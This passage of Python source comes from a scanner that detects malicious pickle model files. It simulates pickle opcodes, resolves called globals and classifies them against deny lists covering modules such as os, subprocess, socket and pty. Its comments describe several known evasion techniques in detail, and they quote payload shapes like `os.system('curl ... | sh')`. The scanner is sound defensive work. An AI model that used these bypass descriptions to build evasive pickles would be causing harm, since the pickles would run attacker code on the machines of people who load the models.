    headroom it should. Per-pickle judging is both what the VM does and the
    more sensitive of the two.

    What is returned is the first per-pickle profile that had out-of-band
    indices, or (when none did) the profile of whichever pickle used the most
    memo slots, so the caller sees the file's real memo shape either way.
    """
    globals_found: list[str] = []
    resolved_calls: list[PickleResolvedCall] = []
    profiles: list[PickleMemoProfile] = []

    stream = io.BytesIO(data)
    total = len(data)
    is_first = True
    resyncs = 0
    budget_exceeded = False
    while stream.tell() < total:
        start = stream.tell()
        calls_before = len(resolved_calls)
        memo_indices: set[int] = set()
        stopped = False
        try:
            _walk_one_pickle(stream, globals_found, resolved_calls, memo_indices)
        except _PickleWalkBudgetExceeded:
            # The simulated stack outgrew its bound. Keep everything resolved
            # so far (discarding it would make "payload first, stack bomb
            # second" a better evasion than the payload alone) and stop
            # reading: the remainder is reported as a coverage gap by the
            # caller via the profile flag, never claimed as analysed.
            profiles.append(_profile_memo_indices(memo_indices))
            _propagate_result_invoked(resolved_calls, calls_before)
            budget_exceeded = True
            break
        except Exception:
            if is_first and not globals_found and not resolved_calls:
                # Nothing resolved at all -- preserve the documented contract
                # that a wholly unparseable stream raises to the caller, so
                # `_scan_pickle` still falls back to its raw-byte signature
                # scan.
                raise
            # Something was resolved before the stream stopped parsing. Keep
            # it: partial opcode evidence beats the substring fallback, which
            # is the whole reason this walk exists.
            #
            # Two real formats land here. torch's legacy layout follows its
            # pickles with raw tensor storage, which simply ends the walk.
            # joblib is the harder one: it interleaves raw array bytes *into*
            # the stream, so the very first pickle dies partway through -- at
            # byte 911 of 183761 in a stock `sklearn-iris` model, after having
            # already resolved five globals. Re-raising there threw those five
            # away and left real sklearn models analyzed by substring match
            # alone.
            stopped = True
        # Profiled even when this pickle stopped parsing partway: joblib
        # streams always do, and the indices read before the stop are as real
        # as any others.
        profiles.append(_profile_memo_indices(memo_indices))
        # Chain marking likewise stops at the pickle boundary: stack and memo
        # reset at STOP, so a chain cannot span two pickles.
        _propagate_result_invoked(resolved_calls, calls_before)
        if stopped:
            # The walk died inside raw data spliced into the stream. joblib
            # does this by design, and a payload placed *after* the arrays was
            # therefore never read: ModelAudit finds one that this walk missed
            # (quickset case joblib-payload-after-raw-array). Skip forward to
            # the next PROTO marker and keep going rather than giving up on
            # the rest of the file.
            if resyncs >= _MAX_PICKLE_RESYNCS:
                break
            resume = _next_pickle_offset(data, max(stream.tell(), start + 1))
            if resume is None:
                break
            resyncs += 1
            stream.seek(resume)
            is_first = False
            continue
        if stream.tell() <= start:
            # Defensive: a zero-length advance would spin forever on a
            # malformed stream, and this walks attacker-controlled bytes.
            break
        is_first = False

    flagged = [p for p in profiles if p.out_of_band]
    if flagged:
        memo_profile = flagged[0]
    elif profiles:
        memo_profile = max(profiles, key=lambda p: p.slots)
    else:
        memo_profile = _profile_memo_indices(set())
    if budget_exceeded and not memo_profile.walk_budget_exceeded:
        memo_profile = dataclasses.replace(memo_profile, walk_budget_exceeded=True)

    return globals_found, resolved_calls, memo_profile


def _propagate_result_invoked(calls: list[PickleResolvedCall], start: int = 0) -> None:
    """Backward fixpoint for result_invoked through intermediary calls.

    The inline marking covers the direct shape (a computed value invoked
    where it was produced). PickleCloak's exp_5/exp_28/exp_88 insert an
    intermediary: `next(attr_chain(...))` is itself a call whose result is
    invoked, so the invocation marks `next`, not `attr_chain`. One hop is
    not the chain. Whenever a call is marked, the calls that produced its
    arguments are one step closer to the invocation too, so marking
    propagates backward through `chained_from` until nothing new is marked.
    Runs per pickle (chains cannot cross a STOP: memo and stack reset), over
    a handful of records, so the fixpoint is a few passes at most. `start`
    is the first index of the current pickle's calls, not a slice: a slice
    would copy the list and the marks would never land.
    """
    changed = True
    while changed:
        changed = False
        for i in range(start, len(calls)):
            call = calls[i]
            if not call.result_invoked:
                continue
            for ref in call.chained_from:
                for j in range(i - 1, start - 1, -1):
                    if calls[j].ref == ref and not calls[j].result_invoked:
                        calls[j] = dataclasses.replace(calls[j], result_invoked=True)
                        changed = True
                        break


def _walk_one_pickle(
    stream: io.BytesIO,
    globals_found: list[str],
    resolved_calls: list[PickleResolvedCall],
    memo_indices: set[int],
) -> None:
    """Walk exactly one pickle from `stream`, appending what it resolves.

    `memo_indices` collects every memo slot number this pickle stores into,
    for the out-of-band index check. It is filled in place rather than
    returned so the caller still has it after a stream that stops parsing
    partway.

    Consumes through that pickle's STOP opcode and leaves `stream` positioned
    at the next byte, so the caller can walk any pickle that follows.

    Resolves every GLOBAL/STACK_GLOBAL/INST/OBJ reference in the pickle
    to a `module.name` string, and additionally resolves any
    REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ call site whose arguments are literal
    constants to a `PickleResolvedCall` (callable + concrete args) -- e.g.
    resolving `os.system('curl ... | sh')` instead of just noting that
    `os.system` was referenced somewhere in the stream.

    Walks the opcode stream with a stack/memo simulation covering
    string/int/float/bytes pushes, memo ops, container opcodes
    (TUPLE*/LIST/DICT/SET* and their APPEND*/SETITEM*/ADDITEMS mutators),
    MARK, and the call-construction opcodes (REDUCE/NEWOBJ/NEWOBJ_EX/INST/
    OBJ/BUILD). Where a call's arguments can't be resolved to literals (e.g.
    built from another REDUCE's return value), only the bare callable
    reference is recorded, matching prior behavior -- this never guesses at
    a value. Raises whatever pickletools.genops raises on an unparseable
    stream -- callers should catch and fall back to a weaker signal.
    """
    import pickletools

    # Fresh per pickle: a real Unpickler starts each load() with an empty
    # stack and memo, so memo indices from an earlier pickle in the same file
    # must not be visible here.
    stack: list[Any] = []
    memo: dict[int, Any] = {}
    auto_memo_idx = 0

    def _record_call(callable_val: Any, args: Any, kwargs: dict | None = None) -> None:
        if isinstance(callable_val, _PickleCallResultType):
            # The pickle is invoking a value it computed earlier in the same
            # stream, rather than a global it named. Nothing about *this* call
            # can be reported (the callable has no name to report), but the
            # call that produced the callable is now known to have been
            # invoked, which is what the chain signal keys on. Mark the most
            # recent recording of that producer.
            for i in range(len(resolved_calls) - 1, -1, -1):
                if resolved_calls[i].ref == callable_val.ref:
                    resolved_calls[i] = dataclasses.replace(
                        resolved_calls[i], result_invoked=True
                    )
                    break
            return
        if not isinstance(callable_val, str):
            return
        if not isinstance(args, (tuple, list)):
            return
        args_tuple = tuple(args)
        kwargs_literal = kwargs is None or _is_pickle_literal(tuple(kwargs.values()))
        if _is_pickle_literal(args_tuple) and kwargs_literal:
            resolved_calls.append(
                PickleResolvedCall(callable_val, args_tuple, dict(kwargs) if kwargs else None)
            )
            return

        # Partially resolved: at least one argument is opaque, so `args` would
        # be a lie. Keep only the literal text that really is there. See
        # PickleResolvedCall.partial_texts for why discarding it was wrong.
        seen: list[str] = []
        chained: list[str] = []
        for value in _iter_pickle_arg_values((args_tuple, kwargs or {})):
            if isinstance(value, _PickleCallResultType):
                if value.ref not in chained and len(chained) < _PICKLE_MAX_PARTIAL_TEXTS:
                    chained.append(value.ref)
            elif (text := _pickle_arg_text(value)) is not None and text not in seen:
                if len(seen) < _PICKLE_MAX_PARTIAL_TEXTS:
                    seen.append(text)
            # Both collections are capped for the same reason: argument lists
            # are attacker-sized. Stop only once neither can grow.
            if len(seen) >= _PICKLE_MAX_PARTIAL_TEXTS and len(chained) >= _PICKLE_MAX_PARTIAL_TEXTS:
                break
        if seen or chained:
            # A call carrying no literal text still matters when it consumes a
            # computed value: `next(attr_chain(...))` is the intermediary link
            # in PickleCloak's resolver chains, and dropping it here broke the
            # result-invoked marking the chain signal needs (the final call
            # marks the most recent call with the callable's ref, which is
            # this one).
            resolved_calls.append(
                PickleResolvedCall(callable_val, (), None, tuple(seen), tuple(chained))
            )

    for op, arg, _pos in pickletools.genops(stream):
        if len(stack) > _scanner._PICKLE_STACK_MAX_DEPTH:
            raise _PickleWalkBudgetExceeded
        name = op.name
        if (
            (name in _STRING_PUSH_OPCODES and isinstance(arg, str))
            or (name in _INT_PUSH_OPCODES and isinstance(arg, int))
            or (name in _FLOAT_PUSH_OPCODES and isinstance(arg, float))
        ):
            stack.append(arg)
        elif name in _BYTES_PUSH_OPCODES and isinstance(arg, (bytes, bytearray)):
            stack.append(bytes(arg))
        elif name == "NONE":
            stack.append(None)
        elif name == "NEWTRUE":
            stack.append(True)
        elif name == "NEWFALSE":
            stack.append(False)
        elif name in _OPAQUE_PUSH_OPCODES:
            # Opcodes that push a value this walk cannot know: a persistent-ID
            # lookup (PERSID/BINPERSID), a copyreg extension-registry lookup
            # (EXT1/EXT2/EXT4), or a protocol-5 out-of-band buffer
            # (NEXT_BUFFER). The *value* is unknowable, but the push is not
            # optional: skipping it desynchronizes the simulated stack against
            # the real VM for every subsequent opcode.
            #
            # That desync was a 3-byte evasion of the argument-evidence
            # re-triage. `EXT1` followed by `POP` leaves the real stack
            # untouched (push then pop) while this walk, having pushed
            # nothing, popped the *callable* instead -- so a
            # `pip.main('http://...')` that still executes on load resolved to
            # no call at all and fell from HIGH back to the suppressed INFO
            # bucket. Denied globals were never affected (`globals_found` is
            # recorded at GLOBAL time, independent of the stack), which is
            # exactly why this hid only in the unknown bucket, where every
            # bypass gadget already lives.
            stack.append(_PICKLE_OPAQUE)
        elif name == "BINPERSID":
            # Pops the pid off the stack and pushes the resolved object.
            if stack:
                stack[-1] = _PICKLE_OPAQUE
        elif name == "READONLY_BUFFER":
            # Wraps the buffer on top of the stack; depth is unchanged, and
            # the result is no more knowable than the input.
            if stack:
                stack[-1] = _PICKLE_OPAQUE
        elif name == "MARK":
            stack.append(_PICKLE_MARK)
        elif name == "EMPTY_TUPLE":
            stack.append(())
        elif name == "EMPTY_LIST":
            stack.append([])
        elif name == "EMPTY_DICT":
            stack.append({})
        elif name == "EMPTY_SET":
            stack.append(set())
        elif name == "TUPLE1":
            if stack:
                stack[-1] = (stack[-1],)
        elif name == "TUPLE2":
            if len(stack) >= 2:
                b, a = stack.pop(), stack.pop()
                stack.append((a, b))
        elif name == "TUPLE3":
            if len(stack) >= 3:
                c, b, a = stack.pop(), stack.pop(), stack.pop()
                stack.append((a, b, c))
        elif name == "TUPLE":
            stack.append(tuple(_pop_to_mark(stack)))
        elif name == "LIST":
            stack.append(_pop_to_mark(stack))
        elif name == "FROZENSET":
            items = _pop_to_mark(stack)
            members: set[Any] = set()
            for item in items:
                # A real unpickle dies on an unhashable element; this walk
                # keeps the hashable members and goes on, consistent with
                # SETITEM/SETITEMS below, so one junk element cannot kill
                # the rest of the analysis at an attacker-chosen point.
                with contextlib.suppress(TypeError):
                    members.add(item)
            stack.append(frozenset(members))
        elif name == "APPEND":
            if len(stack) >= 2:
                value = stack.pop()
                if isinstance(stack[-1], list):
                    stack[-1].append(value)
        elif name == "APPENDS":
            items = _pop_to_mark(stack)
            if stack and isinstance(stack[-1], list):
                stack[-1].extend(items)
        elif name == "ADDITEMS":
            items = _pop_to_mark(stack)
            if stack and isinstance(stack[-1], set):
                stack[-1].update(items)
        elif name == "DICT":
            items = _pop_to_mark(stack)
            result: dict[Any, Any] = {}
            for i in range(0, len(items) - 1, 2):
                # Suppress TypeError on an unhashable key exactly the way
                # SETITEM/SETITEMS do, so one junk key cannot kill the walk.
                with contextlib.suppress(TypeError):
                    result[items[i]] = items[i + 1]
            stack.append(result)
        elif name == "SETITEM":
            if len(stack) >= 3:
                value, key = stack.pop(), stack.pop()
                if isinstance(stack[-1], dict):
                    with contextlib.suppress(TypeError):
                        stack[-1][key] = value
        elif name == "SETITEMS":
            items = _pop_to_mark(stack)
            if stack and isinstance(stack[-1], dict):
                for i in range(0, len(items) - 1, 2):
                    with contextlib.suppress(TypeError):
                        stack[-1][items[i]] = items[i + 1]
        elif name == "POP":
            if stack:
                stack.pop()
        elif name == "POP_MARK":
            _pop_to_mark(stack)
        elif name == "DUP":
            if stack:
                stack.append(stack[-1])
        elif name == "MEMOIZE":
            # The memo dict itself is capped as well as the index set it is
            # profiled into (see _PICKLE_MEMO_MAX_ENTRIES): past the cap the
            # memo freezes and the walk goes on.
            if stack and len(memo) < _scanner._PICKLE_MEMO_MAX_ENTRIES:
                memo[auto_memo_idx] = stack[-1]
            if len(memo_indices) < _MEMO_INDEX_MAX_TRACKED:
                memo_indices.add(auto_memo_idx)
            auto_memo_idx += 1
        elif name in _MEMO_STORE_OPCODES:
            if isinstance(arg, int):
                # Recorded even when the stack is empty: an index written by a
                # spliced block is evidence about the *writer* regardless of
                # whether this walk can model what it stored there. Bounded,
                # because that is otherwise a free memory amplification on
                # attacker-controlled bytes (see _MEMO_INDEX_MAX_TRACKED).
                if len(memo_indices) < _MEMO_INDEX_MAX_TRACKED:
                    memo_indices.add(arg)
                if stack and len(memo) < _scanner._PICKLE_MEMO_MAX_ENTRIES:
                    memo[arg] = stack[-1]
        elif name in _MEMO_FETCH_OPCODES:
            if isinstance(arg, int) and arg in memo:
                stack.append(memo[arg])
        elif name == "GLOBAL" and isinstance(arg, str):
            # Protocol 0-2: arg is "module qualname" (space-separated).
            parts = arg.split(" ", 1)
            if len(parts) == 2:
                ref = f"{parts[0]}.{parts[1]}"
                globals_found.append(ref)
                if (laundered := _laundered_denied_ref(parts[1])) is not None:
                    globals_found.append(laundered)
                stack.append(_PickleGlobalRef(ref))
        elif name == "INST" and isinstance(arg, str):
            # Protocol 0's old-style-class instantiation opcode. Resolves a
            # callable through the identical find_class(module, name) path
            # GLOBAL uses -- pickletools.genops hands back the same
            # "module qualname" (space-separated) argument shape -- and then
            # calls it directly with whatever args were pushed since the
            # preceding MARK, without a separate REDUCE/BUILD opcode in
            # between. Undetected, this is a full bypass of the GLOBAL/
            # STACK_GLOBAL-only walk below. The mark-to-top values are the
            # call's actual arguments (e.g. the shell command passed to
            # os.system), so -- now that container/literal opcodes are
            # simulated -- they're captured as resolved-call evidence too,
            # not just consumed to keep the stack in sync.
            call_args = tuple(_pop_to_mark(stack))
            parts = arg.split(" ", 1)
            if len(parts) == 2:
                ref = f"{parts[0]}.{parts[1]}"
                globals_found.append(ref)
                if (laundered := _laundered_denied_ref(parts[1])) is not None:
                    globals_found.append(laundered)
                _record_call(ref, call_args)
                # Real semantics push the newly constructed *instance*, not
                # the class -- an opaque value, so a later opcode can't
                # mistake it for a re-usable global reference or literal.
                stack.append(_PickleCallResultType(ref))
        elif name == "OBJ":
            # Protocol 0's other old-style-instantiation opcode: like INST,
            # but the class is the first item after MARK (already resolved
            # to a ref string by an earlier GLOBAL) rather than encoded in
            # OBJ's own argument.
            items = _pop_to_mark(stack)
            cls_ref = items[0] if items else None
            if items:
                _record_call(cls_ref, tuple(items[1:]))
            stack.append(
                _PickleCallResultType(cls_ref) if isinstance(cls_ref, str) else _PICKLE_OPAQUE
            )
        elif name == "STACK_GLOBAL":
            # Protocol 4+: module and qualname were pushed as the two
            # preceding string constants.
            if len(stack) >= 2:
                qualname = stack.pop()
                module = stack.pop()
                if isinstance(module, str) and isinstance(qualname, str):
                    ref = f"{module}.{qualname}"
                    globals_found.append(ref)
                    if (laundered := _laundered_denied_ref(qualname)) is not None:
                        globals_found.append(laundered)
                    stack.append(_PickleGlobalRef(ref))
                else:
                    # Non-string operands (a real unpickler raises here). No
                    # callable can be named, so record nothing and push an
                    # opaque value -- recording the f-string of two markers
                    # used to fabricate junk globals like
                    # "<PICKLE-OPAQUE>.<PICKLE-OPAQUE>" in the unknown bucket.
                    stack.append(_PICKLE_OPAQUE)
        elif name == "REDUCE":
            if len(stack) >= 2:
                raw_args = stack.pop()
                callable_val = stack.pop()
                _record_call(callable_val, raw_args)
                stack.append(
                    _PickleCallResultType(callable_val)
                    if isinstance(callable_val, str) else _PICKLE_OPAQUE
                )
        elif name == "NEWOBJ":
            # Protocol 2+'s construction opcode -- how most modern PyTorch
            # pickles actually build tensors/objects (cls.__new__(cls, *args)).
            if len(stack) >= 2:
                raw_args = stack.pop()
                cls_val = stack.pop()
                _record_call(cls_val, raw_args)
                stack.append(
                    _PickleCallResultType(cls_val)
                    if isinstance(cls_val, str) else _PICKLE_OPAQUE
                )
        elif name == "NEWOBJ_EX":
            if len(stack) >= 3:
                kwargs_val = stack.pop()
                raw_args = stack.pop()
                cls_val = stack.pop()
                _record_call(
                    cls_val,
                    raw_args,
                    kwargs_val if isinstance(kwargs_val, dict) else None,
                )
                stack.append(
                    _PickleCallResultType(cls_val)
                    if isinstance(cls_val, str) else _PICKLE_OPAQUE
                )
        elif name == "BUILD":
            # obj.__setstate__(state) / obj.__dict__.update(state) mutates
            # obj in place and returns nothing -- the state argument is
            # popped, and obj (pushed by the preceding REDUCE/NEWOBJ/NEWOBJ_EX)
            # is left on top of the stack unchanged. Needed purely to keep
            # later opcodes from desyncing; BUILD itself doesn't call
            # arbitrary code.
            if stack:
                stack.pop()


# Modules where *any* member is denied, matched on the module prefix rather
# than an exact `module.name`. Adopted from picklescan's `_unsafe_globals`
# wildcard entries (MIT).
#
# This reverses an earlier judgement in this branch, and the reversal is worth
# recording because the first call was made on reasoning and the second on
# measurement. The original decision took picklescan's 57 explicit names and
# skipped its 36 wildcards, on the grounds that a whole-module deny costs
# precision -- citing its `uuid: *` entry, which reports an ordinary pickled
# `uuid.UUID` as a dangerous import.
#
# Scored against picklescan's own 46-file corpus, that choice cost **9 of 35
# detections**: `httplib.HTTPSConnection`, `aiohttp.client.ClientSession`,
# `sys.exit`, `pickle.loads`, `_pickle.loads`, `bdb.Bdb`, `bdb.Bdb.run`,
# `pip.main` and `pydoc.pipepager` all sit in wildcarded modules and all landed
# in the unknown bucket. This scanner scored 54% there while scoring 100% on the
# corpus written alongside it, which is what an author-written benchmark is
# worth.
#
# The precision worry did not survive contact with data: across 12 real benign
# models (torch zip, torch legacy, raw and zlib joblib, sklearn with custom
# classes) **none** of the 36 modules occurs even once. picklescan ships these
# wildcards inside HuggingFace's own scanning, so they run against far more
# real-world models than any corpus here.
#
# `uuid` is the sole exclusion, because it is the one entry with a
# demonstrated false positive: `uuid.UUID` is an ordinary pickled value.
# Everything reachable in `uuid` that matters (its ctypes loading) is denied
# through `ctypes` anyway.
_PICKLE_DENIED_MODULES: frozenset[str] = frozenset({
    "_aix_support", "_osx_support", "_pickle", "_pyrepl", "aiohttp", "asyncio",
    "bdb", "cProfile", "commands", "ctypes", "distutils.file_util", "httplib",
    "nt", "numpy.f2py", "numpy.testing._private.utils", "os", "pdb", "pickle",
    "pip", "posix", "profile", "pty", "pydoc", "requests.api", "runpy",
    "shutil", "socket", "ssl", "subprocess", "sys", "test", "timeit",
    "urllib.request", "venv", "webbrowser",
})


def _is_denied_pickle_module(ref: str) -> bool:
    """True if `ref` belongs to a wholly-denied module.

    Matches on dotted-component boundaries so `pickle.loads` and
    `urllib.request.urlopen` match while `pickletools.dis` and `ossaudiodev`
    do not -- a bare `startswith` would deny anything merely beginning with
    those letters.
    """
    for module in _PICKLE_DENIED_MODULES:
        if ref == module or ref.startswith(module + "."):
            return True
    return False


def _classify_pickle_global(ref: str) -> str:
    """Classify a resolved `module.name` global as denied/allowed/unknown."""
    if ref in PICKLE_DENIED_GLOBALS:
        return "denied"
    # Allow-list wins over the module wildcard: `torch.serialization._get_layout`
    # and the numpy rebuild helpers are legitimate members of otherwise
    # uninteresting modules, and none of the wildcarded modules overlaps the
    # allow list today -- but the ordering makes that safe if one ever does.
    if ref in PICKLE_ALLOWED_GLOBALS or _is_ml_constructor_allowed(ref):
        return "allowed"
    if _is_denied_pickle_module(ref):
        return "denied"
    module, _, name = ref.rpartition(".")
    if module in _PICKLE_ALLOWED_STORAGE_PARENTS and _PICKLE_STORAGE_NAME_RE.match(name):
        return "allowed"
    root = module.partition(".")[0]
    if root in _PICKLE_ALLOWED_ML_CLASS_ROOTS and _PICKLE_ML_CLASS_NAME_RE.match(name):
        return "allowed"
    return "unknown"


def _laundered_denied_ref(qualname: str) -> str | None:
    """The denied callable a dotted GLOBAL *name* reaches by attribute walk.

    A deny list keyed on the joined `module.name` string is bypassed by moving
    the interesting half into the name. CPython's `Unpickler.find_class`, for
    protocol 4 and above, resolves the name with `pickle._getattribute`, which
    splits on "." and getattrs each segment in turn. So

        GLOBAL "torch.serialization" "os.system"

    resolves to `os.system` on load, while the joined ref this walk records is
    `torch.serialization.os.system`, which is on no list and lands in the
    unknown bucket. Any module that does `import os` works as the prefix --
    logging, shutil, zipfile, pathlib, tarfile and platform all do -- so the
    supply of benign-looking prefixes is effectively unlimited and no amount of
    adding names to the deny list closes it.

    Every tail of the qualname is reachable, not just the whole of it, because
    the walk is per-segment: `_getattribute(os, "path.os.system")` succeeds the
    same way. The module half is not traversed (it is a single `sys.modules`
    lookup), so tails starting inside it are not candidates.

    Returns the first tail that is already denied, or None. Deliberately
    narrow: nothing is reported unless it resolves to something the deny list
    already covers, so a benign dotted qualname such as a nested class
    `Outer.Inner` is unaffected. Not gated on the protocol byte -- a dotted
    name that spells a denied callable is evidence of intent even in a
    protocol-2 stream where it would fail to load.
    """
    if "." not in qualname:
        return None
    parts = qualname.split(".")
    for i in range(len(parts) - 1):
        candidate = ".".join(parts[i:])
        if _classify_pickle_global(candidate) == "denied":
            return candidate
    return None


# ── Unknown-bucket re-triage ────────────────────────────────────────
#
# An unknown global is one that is on neither list, and that bucket is where
# every publicly documented picklescan bypass lands: `torch.utils.collect_env
# .run` (CVE-2025-71350), `pip.main` (CVE-2025-1716), `linecache`/`ssl` used
# for DNS exfiltration (CVE-2025-46417), `builtins.getattr` and
# `operator.attrgetter` chains. Reporting all of them at INFO with the words
# "likely a legitimate custom class" put the working bypasses in the tier
# triagers suppress -- the allow/deny/unknown split was doing its job and the
# severity assignment was throwing the result away.
#
# The re-triage below deliberately keys on *evidence*, not on names, because a
# new list of bad names would inherit the same completeness problem that
# created this gap. Every signal reads the resolved call arguments -- what the
# callable would actually be invoked with -- which the opcode walk already
# recovers. Nothing reads the callable's own name.
#
# Note what is deliberately NOT a signal: whether the global is invoked at all.
# That was the obvious first cut, and it does not work -- a benign pickle
# containing any custom class produces `mypackage.MyModel()` as a resolved
# call just as surely as a gadget does, so escalating on invocation alone
# would escalate essentially every model file with a custom class in it.
# Invocation is a precondition for the argument signals, not evidence itself.

_PICKLE_ARG_URL_RE = re.compile(r"\b[a-z][a-z0-9+.\-]{1,15}://", re.I)
# A shell metacharacter adjacent to whitespace, i.e. used as an operator
# rather than merely present. `curl http://x | sh` matches; an ordinary
# value like `a;b` or a base64 blob containing `+/=` does not.
_PICKLE_ARG_SHELL_RE = re.compile(r"\$\(|`|\s[;&|]|[;&|]\s")
# Callables that rebuild a code object or a function from its parts. Every
# code object carries co_filename, the absolute path of the source it was
# compiled from, so a path argument here is structural metadata rather than a
# choice the pickle's author made. Measured on SafePickle's benign half: 81 of
# 644 real models were promoted to a LOW finding on strings like
# "/nfs/staff-hdd/.../site-packages/timm/layers/conv2d_same.py".
#
# The same applies to the identifier arguments. dill and cloudpickle serialise
# a function together with the names its body references, so a function that
# calls compile() or open() carries those names as data. Reading them as a
# getattr/attrgetter chain resolving a denied callable is the same mistake as
# reading co_filename as a chosen path: 80 more of SafePickle's 644 benign
# models were promoted this way.
#
# Suppressed for these callables: the path signal and the attribute-name
# signal. Still promoting: a URL, a shell-shaped string, a (host, port) pair,
# and a literal that is Python *source* resolving a denied callable. None of
# those is anything a code object carries by construction, and the real sink
# in a dill-based gadget is still reached by MFV-PICKLE-001.
_PICKLE_CODE_OBJECT_BUILDERS: frozenset[str] = frozenset({
    "dill._dill._create_code",
    "dill._dill._create_function",
    "dill._dill._create_type",
    "cloudpickle.cloudpickle._make_function",
    "cloudpickle.cloudpickle._make_skel_func",
    "cloudpickle.cloudpickle._builtin_type",
    "types.CodeType",
    "types.FunctionType",
    "marshal.loads",
})


# Callables whose first argument is a pattern, not a command. A regex is dense
# with the same characters a shell line uses (| ^ $ ( ) . *), so running the
# command-shape patterns over one measures how complex the regex is. 40 of
# SafePickle's benign models were promoted on tokeniser patterns like
# "^§|^%|^=|^—|^–|^\\+(?![0-9])".
_PICKLE_PATTERN_ARG_CALLABLES: frozenset[str] = frozenset({
    "re._compile", "re.compile", "regex._compile", "regex.compile",
})


_PICKLE_ARG_PATH_RE = re.compile(r"^(?:/|~/|[A-Za-z]:[\\/])|\.\.[\\/]")
_PICKLE_ARG_HOSTNAME_RE = re.compile(
    r"^(?:[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z0-9\-]+$"
)

# Attribute names of the callables already on the deny list, e.g. "system"
# from "os.system". An unknown callable handed one of these as a literal
# string is the shape of a `getattr(module, "system")` / `attrgetter("system")`
# chain resolving a denied callable dynamically -- the exact move that keeps
# the denied name out of the opcode stream where a deny list would see it.
# Derived from the existing deny list rather than written out fresh, so it
# carries no new completeness debt.
#
# This started as a length rule (keep dunders and names of 6+ characters) on
# the theory that short names are ordinary English and would fire on benign
# arguments. That was exactly backwards for the names that matter: it dropped
# `eval`, `exec`, `popen`, `fork`, `spawn` and `CDLL` -- the canonical targets
# of `getattr(module, "eval")`, which is the chaining technique Slaviero
# documented in 2011 and every guide since has repeated. Length was a proxy
# for "reads as an ordinary word"; the proxy is now replaced by naming the
# handful of entries that genuinely do.
_PICKLE_GENERIC_ATTR_NAMES: frozenset[str] = frozenset({
    # Ordinary vocabulary that plausibly appears as a literal string in
    # legitimate model metadata (a stage name, a mode, a config value).
    "run", "call", "get", "load", "loads", "open", "apply", "remove", "start",
})
_PICKLE_DENIED_ATTR_NAMES: frozenset[str] = frozenset(
    name
    for name in (ref.rpartition(".")[2] for ref in PICKLE_DENIED_GLOBALS)
    if name not in _PICKLE_GENERIC_ATTR_NAMES
)


# Allowlisted callables that legitimately receive a string argument. Everything
# else on the allow list reconstructs a container, a tensor or a dtype from
# structural data and never takes free text.
#
# This is a *type contract*, not a badness list, and it is complete over
# PICKLE_ALLOWED_GLOBALS because that list is ours. That completeness is the
# point: a badness list cannot be complete, but "which of my own 25 allowlisted
# entries accept a string" can be.
_PICKLE_ALLOWED_STRING_ARG_OK: frozenset[str] = frozenset({
    "_codecs.encode",                    # _codecs.encode('\\xe9', 'latin1')
    "numpy.dtype",                       # numpy.dtype('f8')
    "torch.serialization._get_layout",   # torch.serialization._get_layout('torch.strided')
    "torch.device",                      # torch.device('cuda', 0): device names are strings
    # numpy.core.multiarray._reconstruct('numpy.ndarray', shape, dtype) is how
    # every ndarray pickled under protocols 0/1 reduces: the subtype arrives as
    # a *string*, not a global ref. Any numpy-bearing pickle old enough to be
    # in text form carries exactly this call, so the string-argument premise is
    # false at the source for this one callable. Both module spellings appear
    # in the wild (numpy < 2 vs >= 2). An attacker who has trojaned numpy gains
    # nothing extra from the string: _reconstruct is already theirs to abuse.
    "numpy.core.multiarray._reconstruct",
    "numpy._core.multiarray._reconstruct",
    # Same era, same shape: scalar(dtype_code, bytes) pickled under protocols
    # 0/1 carries the dtype as a string code ('i8', 'f8'). Measured on a real
    # sklearn StandardScaler from the quickset benign corpus.
    "numpy.core.multiarray.scalar",
    "numpy._core.multiarray.scalar",
})


def _allowed_call_has_anomalous_string(ref: str, call: PickleResolvedCall | None) -> str | None:
    """Return a reason if an allowlisted callable is handed free text it has no
    legitimate use for, else None.

    This is what catches ShadowPickle's Overwritten Module variant, which is
    reported at 63% evasion and 0% detection by both picklescan and ModelScan.
    That attack never names anything dangerous: it calls
    `collections.OrderedDict("ls -la")` and relies on a trojaned `collections`
    in the victim environment to execute the string.

    Deliberately a shape check rather than a content check. The payloads in
    that work include `ls -la` and multi-line Python source, neither of which
    trips the URL, shell-metacharacter or leading-path patterns used elsewhere
    in this module -- and chasing those patterns would be an arms race over
    string contents. What does not vary is that a mapping or tensor
    reconstructor has no reason to receive free text at all, whatever that
    text says.
    """
    if call is None or ref in _PICKLE_ALLOWED_STRING_ARG_OK:
        return None
    texts = [
        text
        for text in (
            _pickle_arg_text(v)
            for v in _iter_pickle_arg_values((call.args, call.kwargs or {}))
        )
        if text
    ]
    if not texts:
        return None
    longest = max(texts, key=len)
    return (
        f"is allowlisted but is invoked with a string argument "
        f"({_PICKLE_ARG_REPR.repr(longest)}), which it has no legitimate use for"
    )


# Upper bound on an argument string this walk is willing to hand to
# `ast.parse`. Parsing is the one place a *value* (not merely its shape)
# drives real work, and these bytes are attacker-chosen; a megabyte of
# pathological nesting is cheap to write and not cheap to parse. Real
# one-liner payloads are tens of characters, so the bound costs no recall.
_PICKLE_MAX_SOURCE_PARSE_BYTES = 4096


def _iter_pickle_source_targets(text: str):
    """Yield every dotted callable name `text` would resolve if executed as
    Python.

    This generalises the existing "argument names a denied global" check from
    an exact string match to the language's own grammar. That check compares
    the whole argument against the classifier, so it sees ``'os.system'`` but
    not ``"__import__('os').system('ls')"`` -- and the second is what an
    eval-family gadget is actually handed, because the gadget needs an
    expression, not a name.

    The mechanism is unchanged and no new list appears: the caller re-runs
    `_classify_pickle_global` over what comes out of here. What changes is
    that the target is recovered through Python syntax instead of requiring
    the attacker to have written it bare. The interchangeable part is the
    evaluator (`sympify`, `eval_expr`, `lambdify`, a logging config's
    ``class=``, an `sT` repr round-trip); the part that cannot vary is that
    the source names something that executes.
    """
    if len(text) > _PICKLE_MAX_SOURCE_PARSE_BYTES or "(" not in text:
        # No call syntax means no callable is resolved, whatever else the
        # string parses to. Bare dotted names are already covered by the
        # exact-match check, and requiring a parenthesis keeps ordinary
        # metadata out of the parser entirely.
        return
    try:
        tree = ast.parse(text)
    except (SyntaxError, ValueError, MemoryError, RecursionError):
        # Not Python. By far the common case for a benign string, and the
        # reason this is safe to run over every argument.
        return

    def dotted(node: Any) -> str | None:
        """Reconstruct the dotted name a value-expression denotes, or None."""
        if isinstance(node, ast.Name):
            return node.id
        if isinstance(node, ast.Attribute):
            base = dotted(node.value)
            return f"{base}.{node.attr}" if base else None
        if isinstance(node, ast.Call):
            # `__import__('os')` and `importlib.import_module('os')` denote
            # the module they name, which is what makes
